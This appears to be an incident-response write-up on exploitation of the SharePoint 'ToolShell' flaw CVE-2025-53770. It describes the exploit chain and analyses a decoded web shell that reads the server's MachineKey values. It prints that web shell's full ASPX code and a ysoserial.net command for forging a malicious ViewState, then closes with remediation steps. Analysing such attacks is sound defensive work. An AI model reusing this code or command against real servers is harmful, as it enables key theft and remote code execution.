🔬 Step 4: Vulnerability Deep Dive - CVE-2025-53770

CVE-2025-53770 (ToolShell) is a critical deserialization vulnerability in on-premises Microsoft SharePoint Server that allows unauthenticated remote code execution (RCE). It is chained with other SharePoint flaws to fully compromise systems.

📸 CVE-2025-53770 - CVSS 9.8 Critical severity
Exploit Chain:

Step CVE Description
1 CVE-2025-49706 Auth bypass — Referer: /_layouts/SignOut.aspx skips SharePoint authentication
2 CVE-2025-53771 Patch bypass — trailing path segment after ToolPane.aspx evades July 2025 fix
3 CVE-2025-49704 Deserialization — ExcelDataSet.CompressedDataTable triggers BinaryFormatter on a crafted DataSet
4 — RCE — TypeConfuseDelegate gadget chain executes arbitrary commands

Affected Versions:
• SharePoint Server Subscription Edition: 16.0.14326.20450 – 16.0.18526.20424
• SharePoint Server 2019: 16.0.10337.12109 – 16.0.10417.20027
• SharePoint Enterprise Server 2016: 16.0.4351.1000 – 16.0.5508.1000
• SharePoint Server 2013: 15.0.4481.1005 – 15.0.5545.1000

CVSS Score: 9.8 (Critical)
CISA KEV Catalog: Added July 20, 2025
First Public Disclosure: July 19, 2025 (Microsoft blog)

📝 Step 6: Malicious Payload Analysis - Base64 Decoding

The Base64-encoded PowerShell payload from the alert was decoded to understand the attacker's objectives.

📸 Decoding the malicious Base64 PowerShell payload
Decoded Payload:

<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script runat="server" language="c#" CODEPAGE="65001">

public void Page_load()
{
var sy = System.Reflection.Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
var mkt = sy.GetType("System.Web.Configuration.MachineKeySection");
var gac = mkt.GetMethod("GetApplicationConfig", System.Reflection.BindingFlags.Static | System.Reflection.BindingFlags.NonPublic);
var cg = (System.Web.Configuration.MachineKeySection)gac.Invoke(null, new object[0]);
Response.Write(cg.ValidationKey+"|"+cg.Validation+"|"+cg.DecryptionKey+"|"+cg.Decryption+"|"+cg.CompatibilityMode);
}
</script>

What this script does:
• Imports System.Diagnostics and System.IO namespaces
• Loads System.Web assemblies via reflection
• Accesses System.Web.Configuration.MachineKeySection
• Invokes the non-public GetApplicationConfig method
• Retrieves ValidationKey and DecryptionKey from web.config
• Writes keys to response (exfiltrating them to attacker)

🔑 Step 9: MachineKey Extraction - Critical Finding

The attacker successfully accessed and exfiltrated the SharePoint MachineKey, which enables ViewState forgery and persistent access.

📸 MachineKey exfiltration via HTTP response - Critical credential compromise
Extracted MachineKey Components:

ValidationKey: [REDACTED] - Used for ViewState MAC validation (HMACSHA256)
DecryptionKey: [REDACTED] - Used for ViewState encryption (AES)
Validation Algorithm: HMACSHA256
Decryption Algorithm: AES
Compatibility Mode: Framework45

Impact of MachineKey Compromise:
• Attacker can forge signed ViewState payloads
• Enables arbitrary code execution via LosFormatter deserialization
• Persists even after password changes (keys remain valid until rotated)
• Allows decryption of authentication cookies and session data

Attackers can now use ysoserial.net to generate malicious ViewState:
ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "command" --validationkey="[KEY]" --validationalg="HMACSHA256"

🛡️ Recommendations

Immediate

  • Maintain endpoint isolation for SharePoint01 (already contained)
  • Rotate MachineKeys immediately using Set-SPMachineKey PowerShell cmdlet
  • Remove spinstall0.aspx from \15\TEMPLATE\LAYOUTS\ directory
  • Block 107.191.58.76 at perimeter firewall
  • Block the web shell hash across the environment
  • Restart IIS and SharePoint timer service after key rotation

Remediation (Tier 2/3)

  • Apply Microsoft security patch for CVE-2025-53770 (July 2025 emergency update)
  • Run SharePoint Products Configuration Wizard to complete patch installation
  • Check for additional web shells in all layouts directories
  • Review IIS logs for other exploitation attempts
  • Reset all service account credentials that may have been compromised
  • Conduct full forensic investigation of SharePoint01

Long-term Prevention

  • Implement regular MachineKey rotation policy
  • Enable ViewState encryption alongside MAC validation
  • Deploy WAF rules to block ToolPane.aspx POST requests with suspicious Referer headers
  • Monitor for spinstall0.aspx or similar web shell filenames
  • Implement endpoint detection rules for csc.exe execution from w3wp.exe
  • Conduct regular SharePoint security assessments
